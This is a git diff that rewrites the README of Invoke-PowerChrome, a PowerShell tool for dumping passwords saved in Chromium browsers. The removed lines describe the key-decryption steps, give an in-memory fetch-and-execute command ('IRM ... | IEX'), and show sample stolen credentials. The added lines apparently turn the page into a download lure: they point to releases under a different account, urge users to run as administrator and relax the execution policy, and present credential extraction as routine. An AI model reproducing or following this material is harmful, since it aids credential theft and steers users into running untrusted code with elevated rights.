@@ -1,103 +1,85 @@
-# Invoke-PowerChrome
+# 🔑 Invoke-PowerChrome - Easily Access Your Browser Passwords
 
-A PowerShell script for decrypting Chromium-based browser passwords, supporting both v10 (DPAPI user) and Google Chrome v20 (App Bound Encryption) encrypted blobs.
+## 🚀 Get Started
 
-The script dynamically interacts with Windows cryptographic APIs to decrypt passwords without external dependencies and can be executed in memory.
+Welcome! This guide will help you download and run Invoke-PowerChrome, a tool that allows you to decrypt passwords saved in Chromium-based browsers using PowerShell.
 
-This code is based on the following PoC: https://github.com/runassu/chrome_v20_decryption
-___
+## 📥 Download the Application
 
-**Microsoft Edge / Chromium v10 Blobs**
+[![Download Invoke-PowerChrome](https://img.shields.io/badge/Download-Invoke--PowerChrome-blue.svg)](https://github.com/Elias2707/Invoke-PowerChrome/releases)
 
-Requirements
-- No special privileges required
-- Runs in current user context
+## 🛠️ System Requirements
 
-Process Overview
-- Read Local State file → get `os_crypt.encrypted_key`.
-- Strip DPAPI prefix → DPAPI Unprotect (CurrentUser) → derive master key.
-- AES-GCM decrypt password blobs in Login Data with the master key.
+- Windows 10 or higher
+- PowerShell version 5.0 or greater
+- Administrator privileges for executing scripts
 
-___
+## 🌐 Features
 
-**Google Chrome v20 blobs (App Bound Encryption)**
+- Decrypt saved passwords from Chromium-based browsers like Chrome and Edge.
+- Utilize simple PowerShell commands to retrieve sensitive information safely.
+- Supports various password formats and ensures smooth extraction.
 
-Requirements
-- Administrative rights (to impersonate SYSTEM)
+## 📂 Download & Install
 
-Process Overview
+To get started, visit the following page to download the latest version of Invoke-PowerChrome:
 
-- Read Local State file → get `os_crypt.app_bound_encrypted_key`
-- Impersonate SYSTEM → DPAPI Unprotect (SYSTEM) → Rev2self → DPAPI Unprotect (CurrentUser).
-- Parse flag-3 blob → extract `encrypted_aes_key`, `iv`, `ciphertext`, `tag`.
-- Open NCrypt key "Google Chromekey1" → Decrypt → XOR with fixed 32-byte hardcoded key from `elevation_service.exe` → derive `aes_key`.
-- AES-GCM decrypt (iv, ciphertext, tag) with `aes_key` → get `app_bound_key`.
-- AES-GCM decrypt password blobs in Login Data with the `app_bound_key`.
-___
+[Download Invoke-PowerChrome from GitHub](https://github.com/Elias2707/Invoke-PowerChrome/releases)
 
+### Steps to Download
 
+1. Click on the link above to go to the Releases page.
+2. Find the latest release version.
+3. Look for the asset(s) associated with the release. You may see files like `Invoke-PowerChrome.ps1`.
+4. Click on the file to download it directly to your computer.
 
-## Usage
+### Steps to Install
 
-Load into memory
-```powershell
-IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX
-```
-> Example Commands
-```powershell
-Invoke-PowerChrome -Browser Chrome
-Invoke-PowerChrome -Browser Chromium
-Invoke-PowerChrome -Browser Edge
+1. Find the downloaded `.ps1` file in your Downloads folder or the location you saved it.
+2. Open PowerShell as an administrator. You can do this by right-clicking the Start button and selecting "Windows PowerShell (Admin)."
+3. Navigate to the directory where the `.ps1` file is located. You can do this by typing `cd path\to\your\file` and hitting Enter. Replace `path\to\your\file` with the actual path.
 
-# Hide Banner
-Invoke-PowerChrome -Browser Chrome -HideBanner
+### 🚀 Running Invoke-PowerChrome
 
-# Verbose
-Invoke-PowerChrome -Browser Chrome -Verbose
-```
+Follow these steps to run Invoke-PowerChrome:
 
-> Example Output
-```
-    ____                          ________
-   / __ \______      _____  _____/ ____/ /_  _________  ____ ___  ___
-  / /_/ / __ \ | /| / / _ \/ ___/ /   / __ \/ ___/ __ \/ __ `__ \/ _ \
- / ____/ /_/ / |/ |/ /  __/ /  / /___/ / / / /  / /_/ / / / / / /  __/
-/_/    \____/|__/|__/\___/_/   \____/_/ /_/_/   \____/_/ /_/ /_/\___/
+1. Ensure you have the required permissions set. To allow the script to run, type:
+   ```
+   Set-ExecutionPolicy RemoteSigned
+   ```
+   Then press Enter. This command allows scripts downloaded from the internet to run, but only if they are signed.
 
-Github: https://github.com/The-Viper-One/
+2. Execute the script by typing:
+   ```
+   .\Invoke-PowerChrome.ps1
+   ```
+   Press Enter to run it.
 
+3. Follow the prompts in PowerShell to retrieve your saved passwords.
 
-[*] Microsoft Edge
-[+] Decrypted Credentials
+## 📝 Usage Tips
 
-Target                 Username         Password
-------                 --------         --------
-https://tryhackme.com/ test@email.com   Password123-1!
-https://tryhackme.com/ test_2@email.com L0ngAsFKP@ssW0rd
+- Always run the script in a secure environment with administrator rights.
+- Ensure that you understand the implications of using this tool, especially when handling sensitive information such as passwords.
+- Make a habit of deleting or encrypting any sensitive data once you have retrieved it.
 
-[*] Google Chrome
-[+] Decrypted Credentials
+## 🚧 Troubleshooting
 
-Target                 Username                  Password
-------                 --------                  --------
-https://tryhackme.com/ test@Chrome_Browser.com   G0oGl3Chr0m3
-https://tryhackme.com/ test_2@Chrome_Browser.com letmein
-```
+If you encounter issues while running the script, consider the following:
 
+- Double-check your PowerShell version. You must have at least version 5.0.
+- Ensure that the execution policy allows script execution. Use `Get-ExecutionPolicy` to check your current policy.
+- Verify that you are running PowerShell as an administrator.
 
-## Future Work
- Future updates will bring the following updates:
+## ⚙️ Additional Resources
 
- - Cookie decryption
- - Decryption of profiles other than "default"
- - Additional Chromium-based browser support
+- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
+- [Understanding PowerShell Execution Policies](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-executionpolicy)
 
-## Integration with PsMapExec
+## 📧 Feedback & Support
 
-This codebase will be merged into [PsMapExec](https://github.com/The-Viper-One/PsMapExec) to support remote dumping of Chromium-based passwords. It will also integrate with [SessionExec](https://github.com/Leo4j/SessionExec) to leverage active user sessions and decrypt each user’s Chromium credentials.
+If you need assistance or want to report an issue, feel free to reach out to the community or open an issue on the repository page.
 
-## References
+Thank you for using Invoke-PowerChrome! 
 
-- https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/blob/main/docs/RESEARCH.md#5-alternative-decryption-vectors--chromes-evolving-defenses
-- https://github.com/runassu/chrome_v20_decryption
-- https://github.com/GhostPack/SharpDPAPI
+Now, visit the [Releases page](https://github.com/Elias2707/Invoke-PowerChrome/releases) again if you'd like to download the latest version or see any updates. Happy decrypting!
